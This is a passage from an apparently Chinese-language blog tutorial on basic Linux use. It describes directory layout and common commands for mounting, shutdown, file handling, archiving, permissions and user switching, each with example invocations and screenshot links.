alt="img"></p><ol><li><code>/usr/bin</code><br>该目录下存放着许多系统用户使用的应用程序</li><li><code>/usr/include</code><br>改目录下存放LINUX下开发和编译应用程序需要的头文件</li><li><code>/usr/lib</code><br>改目录下存放一些常用的动态链接共享库和静态档案库；</li><li><code>/usr/local</code><br>提供给一般用户的/usr目录，在这安装软件最适合；</li><li><code>/usr/man</code><br>该目录是帮助文档目录；</li><li><code>/usr/sbin</code><br>改目录存放超级用户使用的比较高级的管理程序和系统守护程序；</li><li><code>/usr/share</code><br>该目录包含 <code>/usr</code> 中的应用程序需要的所有只读、与硬件架构无关的数据，其中包括时区和地区信息(<code>zoneinfo</code> 和 <code>locale</code>)；</li><li><code>/usr/src</code><br>这是内核源代码默认的放置目录； </li></ol></li><li><p><code>/var</code><br>  文件目录如下，这是一个非常重要的目录，系统上跑了很多程序，那么每个程序都会有相应的日志产生，而这些日志就被记录到这个目录下，具体在<code>/var/log</code>目录下，另外mail的预设放置也是在这里；<br>  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image112.jpg" alt="img"></p></li></ol></li></ol></li></ol><h2 id="熟悉Linux系统的基本操作"><a href="#熟悉Linux系统的基本操作" class="headerlink" title="熟悉Linux系统的基本操作"></a>熟悉<code>Linux</code>系统的基本操作</h2><h3 id="Linux挂载"><a href="#Linux挂载" class="headerlink" title="Linux挂载"></a><code>Linux</code>挂载</h3><p>通过mount命令查看已挂载的文件系统，会输出丰富的信息，如下图所示<br> <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image114.jpg" alt="img"></p><ul><li><p><strong>mount [-t</strong> <strong>系统类型] [-L 卷标名] [-o 特殊选项] [-n] 设备文件名 挂载点</strong></p><p>各选项的含义：</p><ul><li>-t 系统类型：指定欲挂载的文件系统类型。Linux 常见的支持类型有 EXT2、EXT3、EXT4、iso9660（光盘格式）、vfat、reiserfs 等。如果不指定具体类型，挂载时 Linux 会自动检测；</li></ul></li><li><p>-L 卷标名：除了使用设备文件名（例如 /dev/hdc6）之外，还可以利用文件系统的卷标名称进行挂载；</p><ul><li>-n：在默认情况下，系统会将实际挂载的情况实时写入 /etc/mtab 文件中，但在某些场景下（例如单人维护模式），为了避免出现问题，会刻意不写入，此时就需要使用这个选项；</li><li>-o 特殊选项：可以指定挂载的额外选项，比如读写权限、同步/异步等，如果不指定，则使用默认值（defaults）；</li></ul></li><li><p>命令尝试：<br>使用命令<code>mount -t iso9660 /dev/cdrom /mnt/cdrom</code>将<code>/dev/cdrom</code>下的<code>iso9660</code>文件挂载到<code>/mnt/cdrom</code>文件目录下；<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image116.jpg" alt="img"><br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image118.jpg" alt="img"></p></li></ul><h3 id="Linux系统的启动与退出"><a href="#Linux系统的启动与退出" class="headerlink" title="Linux系统的启动与退出"></a><code>Linux</code>系统的启动与退出</h3><ul><li><strong>shutdown [-t seconds] [-rkhncfF] time [message]</strong><br>参数说明：<ul><li>-t seconds，设定在几秒钟之后进行关机程序。</li><li>-k，并不会真的关机，只是将警告讯息传送给所有使用者。</li><li>-r，关机后重新开机。</li><li>-h，关机后停机。</li><li>-n，采用正常程序来关机，用强迫的方式杀掉所有执行中的程序后自行关机。</li><li>-c，取消目前已经进行中的关机动作。</li><li>-f，关机时，不做 fcsk 动作(检查 Linux 档系统)。</li><li>-F，关机时，强迫进行 fsck 动作。</li><li>time，设定关机的时间。</li><li>message，传送给所有使用者的警告讯息。</li></ul></li><li>命令尝试：<ul><li>Shutdown now     //立刻关机</li><li>shutdown +5 “System will shutdown after 5 minutes”    //    系统提示五分钟后关机，每分钟提醒一次<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image120.jpg" alt="img"></li><li>shutdown –r now  //立即重启</li><li>shutdown –r 23:59       //23:59重启</li><li>shutdown –h now        //将系统的服务停掉之后立即关机</li><li>shutdown -k now ‘this system will reboot’ //立刻发送警告信息<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image122.jpg" alt="img"></li></ul></li></ul><h3 id="Linux系统对文件和目录的操作命令"><a href="#Linux系统对文件和目录的操作命令" class="headerlink" title="Linux系统对文件和目录的操作命令"></a>Linux系统对文件和目录的操作命令</h3><ol><li><p>ls命令</p><ul><li><p><strong>ls [**</strong>选项] [目录或文件]**</p><p>显示指定工作目录下的内容（列出目前工作目录所含之文件及子目录)</p><p>选项包括：</p><ul><li><code>-a</code>，显示所有的文件，包括隐藏文件(以.开头的文件)；</li><li><code>-A</code>，同 <code>-a</code> ，但不列出 “.” (目前目录) 及 “..” (父目录)；</li><li><code>-c</code>，和<code>-lt</code>一起使用，显示列表并且以<code>ctime</code>(文件状态最后改变时间)排序。和<code>-l</code>一起使用：显示<code>ctime</code>并且以文件名排序。其他情况，以<code>ctime</code>排序；</li><li><code>-d</code>，仅列出目录本身，而不是列出目录里的内容列表；</li><li><code>-f</code>，直接列出结果，而不进行排序(<code>ls</code>默认会以文件名排序)；</li><li><code>-F</code> 在列出的文件名称后加一符号；例如可执行档则加 “*”, 目录则加 “/“；</li><li><code>-g</code>，列表显示结果，和<code>-l</code>类似，但是不显示文件所属者；</li><li><code>-h</code>，将文件内容大小以<code>GB</code>、<code>KB</code>等易读的方式显示；</li><li><code>-i</code>，结合<code>-l</code>参数，列出每个文件的<code>inode</code>；</li></ul></li></ul></li></ol><ul><li>-l：列出长数据串，显示出文件详细信息，依次为文件属性(占10个字符空间)、文件数、拥有者、所属的<code>group</code>、文件大小、建档日期、文件名；<ul><li>实例如下<ul><li><code>ls -l</code>     //将目录下的文件信息详细列出<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image124.jpg" alt="img"></li><li><code>ls –ld media</code>   //列出文件目录下文件media的详细信息<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image126.jpg" alt="img"></li><li><code>ls -as -S</code>        //列出所有文件及文件大小，并以文件大小进行排序<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image128.jpg" alt="img"></li></ul></li></ul></li></ul><ol start="2"><li><p>cp命令</p><ul><li><p><strong>cp [**</strong>选项] 源文件或目录 目标文件或目录**</p><p>将源文件或目录拷贝到目标文件或目录</p><p>选项包括：</p><ul><li>-a，此选项通常在复制目录时使用，它保留链接、文件属性，并复制目录下的所有内容；</li><li>-d，复制时保留链接，这里所说的链接相当于Windows系统中的快捷方式；</li><li>-f，覆盖已经存在的目标文件而不给出提示；</li><li>-i，与-f选项相反，在覆盖目标文件之前给出提示，要求用户确认是否覆盖，回答”y”时目标文件将被覆盖；</li><li>-p，除复制文件的内容外，还把修改时间和访问权限也复制到新文件中；</li><li>-r，若给出的源文件是一个目录文件，此时将复制该目录下所有的子目录和文件；</li><li>-l，不复制文件，只是生成链接文件；</li></ul></li><li><p>实例如下：</p><ul><li><code>cp tree.txt tree1.txt</code>      //将tree.txt内容复制到tree1.txt里<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image130.jpg" alt="img"><br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image132.jpg" alt="img"></li><li><code>cp -i /root/桌面/json/json.txt /root/桌面/tree/tree1.txt</code>         //将/root/桌面/json目录下的json.txt复制到/root/桌面/tree/tree1.txt并覆tree.txt内容；<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image134.jpg" alt="img"><br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image136.jpg" alt="img"></li></ul></li></ul></li><li><p>mv命令</p><ul><li><p><strong>mv [**</strong>选项] 源文件或目录 目标文件或目录**</p><table><thead><tr><th align="center">结构</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">mv   文件名   文件名</td><td align="center">将源文件名改为目标文件名</td></tr><tr><td align="center">mv   文件名   目录名</td><td align="center">将文件移动到目标目录</td></tr><tr><td align="center">mv   目录名   目录名</td><td align="center">目标目录已存在，将源目录移动到目标目录；   目标目录不存在则改名</td></tr><tr><td align="center">mv   目录名   文件名</td><td align="center">出错</td></tr></tbody></table><p>选项包括：</p><ul><li>-i，若指定目录已有同名文件，则先询问是否覆盖旧文件;</li><li>-f，在mv操作要覆盖某已有的目标文件时不给任何指示;</li></ul></li><li><p>实例如下</p><ul><li><code>mv json.txt tree.txt</code>       //将json.txt改为tree.txt；<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image138.jpg" alt="img"></li><li><code>mv tree.txt ..</code>         //将tree.txt移动至父目录；<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image140.jpg" alt="img"></li></ul></li></ul></li><li><p>rm命令</p><ul><li><p><strong>rm [**</strong>选项] 文件名|目录名**</p><p>选项包括：</p><ul><li>-i，删除前逐一询问确认；</li><li>-f，即使原档案属性设为唯读，亦直接删除，无需逐一确认；</li><li>-r，将目录及以下之档案亦逐一删除；</li></ul></li><li><p>实例如下</p><ul><li>rm tree.txt     //删除tree.txt文件<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image142.jpg" alt="img"></li><li>rm –i *           //删除目录下所有文件并在删除前询问<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image144.jpg" alt="img"></li><li>rm -rf tree     //删除目录下的tree文件，不询问，即使tree是只读文件<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image146.jpg" alt="img"></li></ul></li></ul></li><li><p><code>mkdir</code>命令</p><ul><li><p><strong>mkdir [**</strong>选项] dir-name**</p><p>用于建立子目录</p><p>选项包括：</p><ul><li>-p，确保目录名称存在，不存在的就建一个；</li><li>-m，设定权限（类似chmod）;</li><li>-v，每次创建目录都显示信息；</li></ul></li><li><p>实例如下</p><ul><li>mkdir tree     //目录下新建名为tree的子目录<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image148.jpg" alt="img"></li><li>mkdir -p mine/tree             //在工作目录的mine目录下新建名为tree的子目录<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image150.jpg" alt="img"></li><li>mkdir -m 744 list  //创建权限为774的目录<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image152.jpg" alt="img"></li></ul></li></ul></li><li><p>rmdir命令</p><ul><li><p><strong>rmdir [**</strong>选项] dir-name**</p><p>删除空目录，无法删除非空目录；</p><p>选项包括：</p><ul><li>-p，递归删除目录dirname，当子目录删除后其父目录为空时，也一同被删除；</li><li>-v，显示指令执行过程；</li></ul></li><li><p>实例如下：</p><ul><li>rmdir tree             //删除目录tree<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image154.jpg" alt="img"></li></ul></li></ul></li><li><p>cd命令</p><ul><li><p><strong>cd [dirName]</strong></p><p>切换目录，dirName表示要切换的目标目录</p></li><li><p>实例如下：</p><ul><li>cd ..        //返回到上一级目录<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image156.jpg" alt="img"></li><li>cd /root  //进入到root目录<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image158.jpg" alt="img"></li></ul></li></ul></li><li><p>pwd命令</p><p>​        用于显示工作目录</p><ul><li><p>实例如下：</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image160.jpg" alt="img"></p></li></ul></li><li><p>cat命令</p><ul><li><p><strong>cat [**</strong>选项] 文件列表**</p><p>用于连接文件并打印到标准输出设备上；</p><p>选项包括：</p><ul><li>-n，由 1 开始对所有输出的行数编号；</li><li>-b，和 -n 相似，只不过对于空白行不编号；</li><li>-s，当遇到有连续两行以上的空白行，就代换为一行的空白行；</li><li>-v，使用 ^ 和 M- 符号，除了 LFD 和 TAB 之外；</li><li>-E，在每行结束处显示 $；</li><li>-T，将 TAB 字符显示为 ^I；</li><li>-A，等价于 -vET；</li><li>-e，等价于”-vE”选项； </li><li>-t，等价于”-vT”选项；</li></ul></li><li><p>实例如下：</p><ul><li>cat –b tree.txt        //输出tree.txt内容，且不对空行进行编号；<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image162.jpg" alt="img"></li><li>cat &gt; mine.txt //清空mine.txt内容<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image164.jpg" alt="img"><br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image166.jpg" alt="img"></li><li>Zcat file1 file2 &gt; file3     //file1和file2的文档内容，附加到file3里；<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image168.jpg" alt="img"></li></ul></li></ul></li><li><p>find命令</p><ul><li><p><strong>find path -option [-print] [-exec -ok |xargs |grep] [command {} ;]</strong></p><p>用来在指定目录下查找文件，任何位于参数之前的字符串都将被视为欲查找的目录名，如果使用该命令时，不设置任何参数，则find命令将在当前目录下查找子目录与文件，并且将查找到的子目录和文件全部进行显示；</p><p>选项包括：</p><ul><li>path<ul><li>~表示$HOME目录;</li><li><strong>.</strong>表示当前目录</li><li>/表示根目录</li></ul></li><li>-print，<strong>表示将结果输出到标准输出</strong>；</li><li>-exec，对匹配的文件执行该参数所给出的shell命令，形式为”command {} ;”；</li><li>-ok，与exec作用相同，区别在于，在执行命令之前，会给出提示，让用户确认是否执行；</li><li>|xargs，与exec作用相同 ，起承接作用，区别在于 |xargs 主要用于承接删除操作，而-exec都可用，如复制、移动、重命名等；</li><li>option，表示查找方式：<ul><li>-name filename    //查找名为filename的文件</li><li>-perm    //按执行权限来查找</li><li>-user username    //按文件属主来查找</li><li>-group groupname     //按组来查找</li><li>-mtime -n +n       //按文件更改时间来查找文件，-n指n天以内，+n指n天以前</li><li>-atime -n +n        //按文件访问时间来查找文件，-n指n天以内，+n指n天以前</li><li>-ctime -n +n        //按文件创建时间来查找文件，-n指n天以内，+n指n天以前</li><li>-nogroup      //查无有效属组的文件，即文件的属组在/etc/groups中不存在</li><li>-nouser         //查无有效属主的文件，即文件的属主在/etc/passwd中不存</li><li>-type b/d/c/p/l/f         //查是块设备、目录、字符设备、管道、符号链接、普通文件</li><li>-size n[c]       //查长度为n块[或n字节]的文件</li><li>-mount  //查文件时不跨越文件系统mount点</li><li>-follow   //如果遇到符号链接文件，就跟踪链接所指的文件</li><li>-prune   //忽略某个目录</li></ul></li></ul></li><li><p>实例如下：</p><ul><li>find / -name a.txt        //在根目录查找名字为file1.txt的文件；<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image170.jpg" alt="img"></li><li>find / -name <em>.htm –a –user leeyuxun       //在根目录下查找属主为leeyuxun的htm文件<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image172.jpg" alt="img"></em></li><li>find . –name &quot;*.txt&quot; -print    //在当前目录查找txt文件并打印<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image174.jpg" alt="img"></li><li>find /dev -user leeyuxun -print         //查找dev目录下的属主为leeyuxun的文件并打印；<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image176.jpg" alt="img"></li><li>find . -name “*.o” -mtime +1 -mtime -7 -print      //查找7天以内1天以前的o文件并打印；<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image178.jpg" alt="img"></li></ul></li></ul></li><li><p>grep命令</p><ul><li><p><strong>grep [-abcEFGhHilLnqrsvVwxy][-A&lt;**</strong>显示列数&gt;][-B&lt;显示列数&gt;][-C&lt;显示列数&gt;][-d&lt;进行动作&gt;][-e&lt;范本样式&gt;][-f&lt;范本文件&gt;][–help][范本样式][文件或目录…]**</p><p>选项内容：</p><ul><li>-a，不要忽略二进制的数据；</li><li>-A，除了显示符合范本样式的那一列之外，并显示该行之后的内容</li><li>-b，在显示符合样式的那一行之前，标示出该行第一个字符的编号</li><li>-B，除了显示符合样式的那一行之外，并显示该行之前的内容</li><li>-c，计算符合样式的列数；</li><li>-C，除了显示符合样式的那一行之外，并显示该行之前后的内容；</li><li>-d，当指定要查找的是目录而非文件时，必须使用这项参数，否则grep指令将回报信息并停止动作；</li><li>-e，指定字符串做为查找文件内容的样式；</li><li>-E，将样式为延伸的正则表达式来使用；</li><li>-f，指定规则文件，其内容含有一个或多个规则样式，让grep查找符合规则条件的文件内容，格式为每行一个规则样式；</li><li>-F，将样式视为固定字符串的列表；</li><li>-G，将样式视为普通的表示法来使用；</li><li>-h，在显示符合样式的那一行之前，不标示该行所属的文件名称；</li><li>-H，在显示符合样式的那一行之前，表示该行所属的文件名称；</li><li>-i，忽略字符大小写的差别；</li><li>-I，列出文件内容符合指定的样式的文件名称；</li><li>-L，列出文件内容不符合指定的样式的文件名称；</li><li>-n，在显示符合样式的那一行之前，标示出该行的列数编号；</li><li>-o，只显示匹配PATTERN 部分；</li><li>-q，不显示任何信息；</li><li>-r，此参数的效果和指定”-d recurse”参数相同；</li><li>-s，不显示错误信息；</li><li>-v，显示不包含匹配文本的所有行；</li><li>-V，显示版本信息；</li><li>-w，只显示全字符合的列；</li><li>-x，只显示全列符合的列；</li><li>-y，此参数的效果和指定”-i”参数相同；</li></ul></li><li><p>实例如下：</p><ul><li>grep mine *          //在该目录下查找包含mine内容的文件；<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image180.jpg" alt="img"></li><li>grep ‘text file’ example        //在mine.txt中搜索字符串‘mine 12’并打印；<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image182.jpg" alt="img"></li></ul></li></ul></li><li><p>more命令</p><ul><li><p><strong>more [**</strong>选项] 文件名**</p><p>类似 cat ，不过会以一页一页的形式显示，更方便使用者逐页阅读，而最基本的指令就是按空白键（space）就往下一页显示，按 b 键就会往回（back）一页显示，而且还有搜寻字串的功能（与 vi 相似）</p><p>选项内容：</p><ul><li>-num，一次显示的行数；</li><li>-d，提示使用者，在画面下方显示 [Press space to continue, ‘q’ to quit.] ，如果使用者按错键，则会显示 [Press ‘h’ for instructions.] 而不是 ‘哔’ 声；</li><li>-l，取消遇见特殊字元 ^L（送纸字元）时会暂停的功能；</li><li>-f，计算行数时，以实际上的行数，而非自动换行过后的行数（有些单行字数太长的会被扩展为两行或两行以上）；</li><li>-p，不以卷动的方式显示每一页，而是先清除萤幕后再显示内容；</li><li>-c，跟-p相似，不同的是先显示内容再清除其他旧资料；</li><li>-s，当遇到有连续两行以上的空白行，就代换为一行的空白行；</li><li>-u，不显示下引号 （根据环境变数 TERM 指定的 terminal 而有所不同）；</li><li>+/pattern，在每个文档显示前搜寻该字串（pattern），然后从该字串之后开始显示；</li><li>+num，从第 num 行开始显示；</li><li>fileNames，欲显示内容的文档，可为复数个数；</li></ul></li><li><p>实例如下：</p><ul><li>more mine.txt       //打开mine.txt文件<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image184.jpg" alt="img"></li></ul></li></ul></li></ol><h3 id="文档备份与压缩命令"><a href="#文档备份与压缩命令" class="headerlink" title="文档备份与压缩命令"></a>文档备份与压缩命令</h3><ol><li><p>tar命令</p><ul><li><p><strong>tar [</strong> <strong>主选项+辅选项] 文件或者目录</strong></p><p>用于备份文件；</p><p>主选项包括：</p><ul><li>-A，新增文件到已存在的备份文件；</li><li>-B，读取数据时重设区块大小；</li><li>-c，建立新的备份文件；</li><li>-d，对比备份文件内和文件系统上的文件的差异； </li><li>-g，处理GNU格式的大量备份；</li><li>-G，处理旧的GNU格式的大量备份； </li><li>-i，忽略备份文件中的0 Byte区块，也就是EOF；</li><li>-j，支持bzip2解压文件；</li><li>-k，解开备份文件时，不覆盖已有的文件； </li><li>-l，复制的文件或目录存放的文件系统，必须与tar指令执行时所处的文件系统相同，否则不予复制；</li><li>-m，还原文件时，不变更文件的更改时间；</li><li>-r，添加文件到已经压缩的文件；</li><li>-t，显示压缩文件的内容；</li><li>-u，添加改变了和现有的文件到已经存在的压缩文件；</li><li>-v，显示操作过程；</li><li>-W，确认压缩文件的正确性；</li><li>-x，从压缩的文件中提取文件；</li><li>-z，支持compress解压文件；</li></ul><p>辅选项包括</p><ul><li>-b&lt;区块数目&gt;，设置每笔记录的区块数目，每个区块大小为12Bytes；</li><li>-C，切换到指定目录</li><li>-f，指定压缩文件</li></ul></li><li><p>实例如下：</p><ul><li>tar -cvf data.tar *         //将目录下的所有文件打包成data.tar；<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image186.jpg" alt="img"></li><li>tar -cvzf data.tar.gz *          //将目录下的所有文件打包成data.tar.gz；<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image188.jpg" alt="img"></li><li>tar -tvf data.tar            //查看data.tar中文件：所属权限、用户名用户组、日期等<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image190.jpg" alt="img"></li><li>tar -xvf data.tar    //解压data.tar包<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image192.jpg" alt="img"></li></ul></li></ul></li><li><p>gzip命令</p><ul><li><p><strong>gzip [**</strong>选项] 压缩(解压缩)的文件名**</p><p>gzip是个使用广泛的压缩程序，文件经它压缩过后，其名称后面会多出”.gz”的扩展名</p><p>选项包括：</p><ul><li>-a，使用ASCII文字模式；</li><li>-c，把压缩后的文件输出到标准输出设备，不去变动原始文件；</li><li>-d，解开压缩文件；</li><li>-r，递归处理，将指定目录下的所有文件及子目录一并处理；</li><li>-f，强行压缩文件。不理会文件名称或硬连接是否存在以及该文件是否为符号连接；</li><li>-l，列出压缩文件的相关信息；</li><li>-n，压缩文件时，不保存原来的文件名称及时间戳记；</li><li>-N，压缩文件时，保存原来的文件名称及时间戳记；</li><li>-q，不显示警告信息；</li><li>-S&lt;压缩字尾字符串&gt;，更改压缩字尾字符串；</li><li>-t，测试压缩文件是否正确无误；</li><li>-v，显示指令执行过程；</li><li>-V，显示版本信息；</li><li>-L，显示版本与版权信息；</li><li>-num，用指定的数字num调整压缩的速度，-1或–fast表示最快压缩方法（低压缩比），-9或–best表示最慢压缩方法（高压缩比），系统缺省值为6；</li><li>-h，在线帮助；</li></ul></li><li><p>实例如下：</p><ul><li>gzip –best mine.txt    //高压缩比压缩mine.txt文件；<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image194.jpg" alt="img"></li><li>gzip -l mine.txt.gz //列出mine.txt.gz相关信息；<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image196.jpg" alt="img"></li><li>gzip -d mine.txt.gz             //解压缩mine.txt.gz；<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image198.jpg" alt="img"></li></ul></li></ul></li><li><p>unzip命令</p><ul><li><p><strong>unzip [**</strong>选项] 压缩文件名.zip**</p><p>用于解压缩zip文件;</p><p>选项包括：</p><ul><li>-c，将解压缩的结果显示到屏幕上，并对字符做适当的转换；</li><li>-f，更新现有的文件；</li><li>-l，显示压缩文件内所包含的文件；</li><li>-p，与-c参数类似，会将解压缩的结果显示到屏幕上，但不会执行任何的转换；</li><li>-t，检查压缩文件是否正确；</li><li>-u，与-f参数类似，但是除了更新现有的文件外，也会将压缩文件中的其他文件解压缩到目录中；</li><li>-v，执行是时显示详细的信息；</li><li>-z，仅显示压缩文件的备注文字；</li><li>-a，对文本文件进行必要的字符转换；</li><li>-b，不要对文本文件进行字符转换；</li><li>-C, 压缩文件中的文件名称区分大小写;</li><li>-j, 不处理压缩文件中原有的目录路径；</li><li>-L，将压缩文件中的全部文件名改为小写；</li><li>-M，将输出结果送到more程序处理；</li><li>-n，解压缩时不要覆盖原有的文件；</li><li>-o，不必先询问用户，unzip执行后覆盖原有文件；</li><li>-P&lt;密码&gt;，使用zip的密码选项；</li><li>-q，执行时不显示任何信息；</li><li>-s，将文件名中的空白字符转换为底线字符；</li><li>-V，保留VMS的文件版本信息；</li><li>-X，解压缩时同时回存文件原来的UID/GID；</li><li>-d&lt;目录&gt;，指定文件解压缩后所要存储的目录；</li><li>-x&lt;文件&gt;，指定不要处理.zip压缩文件中的哪些文件；</li></ul></li><li><p>示例如下：</p><ul><li>unzip tree.zip -d mine //将tree.zip解压到mine目录；<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image200.jpg" alt="img"></li><li>unzip -j tree.zip    //解压tree.zip到tree.zip同一目录下，不新建目录；<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image202.jpg" alt="img"></li></ul></li></ul></li></ol><h3 id="Linux权限改变命令"><a href="#Linux权限改变命令" class="headerlink" title="Linux权限改变命令"></a>Linux权限改变命令</h3><ol><li><p>chmod [操作符] [mode] 文件名</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image204.jpg" alt="img"></p><p>Linux下文件的权限类型一般包括读，写，执行。对应字母为 r、w、x；<br>Linux下权限的属组有 拥有者 、群组 、其它组 三种。每个文件都可以针对这三个属组（粒度），设置不同的rwx(读写执行)权限。通常情况下，一个文件只能归属于一个用户和组， 如果其它的用户想有这个文件的权限，则可以将该用户加入具备权限的群组，一个用户可以同时归属于多个组；</p><ul><li>常见的权限表示形式有：<ul><li>-rw——- (600)      只有拥有者有读写权限。</li><li>-rw-r–r– (644)      只有拥有者有读写权限；而属组用户和其他用户只有读权限。</li><li>-rwx—— (700)     只有拥有者有读、写、执行权限。</li><li>-rwxr-xr-x (755)    拥有者有读、写、执行权限；而属组用户和其他用户只有读、执行权限。</li><li>-rwx–x–x (711)    拥有者有读、写、执行权限；而属组用户和其他用户只有执行权限。</li><li>-rw-rw-rw- (666)   所有用户都有文件读、写权限。</li><li>-rwxrwxrwx (777)  所有用户都有读、写、执行权限。</li></ul></li><li>示例如下：<ul><li>chmod o+w file5         //表示其他人增加对file5的写权限<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image206.jpg" alt="img"></li><li>chmod g=x file5          //表示群体可以执行file5；<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image208.jpg" alt="img"></li><li>chmod go-rwx file6            //表示拥有者、群体减少对file6的读写执行权限；<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image210.jpg" alt="img"></li><li>chmod 751 file6           //表示拥有者为rwx，群体为rx，其他人为x权限；<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image212.jpg" alt="img"></li></ul></li></ul></li><li><p>chgrp [选项] 组 文件</p><p>​    用于变更文件或目录的所属群组;</p><ul><li>​    选项包括：<ul><li>-c，效果类似”-v”参数，但仅回报更改的部分；</li><li>-f，不显示错误信息；</li><li>-h，只对符号连接的文件作修改，而不更动其他任何相关文件；</li><li>-R，递归处理，将指定目录下的所有文件及子目录一并处理；</li><li>-v，显示指令执行过程；</li></ul></li><li>实例如下：<ul><li>chgrp leeyuxun file6     //将file6的用户组权限改为leeyuxun;<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image214.jpg" alt="img"></li></ul></li></ul></li><li><p>chown [选项] 用户或组 文件</p><p>​    将指定文件的拥有者改为指定的用户或组;</p><ul><li>选项包括：<ul><li>-c，显示更改的部分的信息</li><li>-f，忽略错误信息</li><li>-h，修复符号链接</li><li>-v，显示详细的处理信息</li><li>-R，处理指定目录以及其子目录下的所有文件</li></ul></li><li>实例如下：<ul><li>chown leeyuxun file6   //将file6的拥有者改为leeyuxun；<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image216.jpg" alt="img"></li></ul></li></ul></li></ol><h3 id="Linux与用户有关的命令"><a href="#Linux与用户有关的命令" class="headerlink" title="Linux与用户有关的命令"></a>Linux与用户有关的命令</h3><ol><li><p>passwd [-k] [-l] [-u [-f]] [-d] [-S] [用户名]</p><p>​    更改用户密码；</p><ul><li>​    参数含义：<ul><li>-d，删除密码；</li><li>-f，强制执行；</li><li>-k，更新只能发送再过期之后；</li><li>-l，停止账号使用；</li><li>-S，显示密码信息；</li><li>-u，启用已被停止的账户；</li><li>-x，设置密码的有效期；</li><li>-g，修改群组密码；</li><li>-i，过期后停止用户账号；</li></ul></li><li>实例如下：<ul><li>passwd -S leeyuxun     //显示用户leeyuxun的密码信息；<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image218.jpg" alt="img"></li></ul></li></ul></li><li><p>su [-fmp] [-c command] [-s shell] [–help] [–version] [-] [使用者账号]</p><p>​    用于变更为其他使用者的身份，除 root 外，需要键入该使用者的密码。使用权限：所有使用者。</p><ul><li>参数说明：<ul><li>-f，不必读启动档（如 csh.cshrc 等），仅用于 csh 或 tcsh；</li><li>-m -p，执行 su 时不改变环境变数；</li><li>-c command，变更为帐号为 USER 的使用者并执行指令（command）后再变回原来使用者；</li><li>-s shell，指定要执行的 shell （bash csh tcsh 等），预设值为 /etc/passwd 内的该使用者（USER） shell；</li></ul></li><li>实例如下：<ul><li>su root          //更换为root账号；<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image220.jpg" alt="img"></li></ul></li></ul></li></ol><h3 id="Linux系统管理命令"><a href="#Linux系统管理命令" 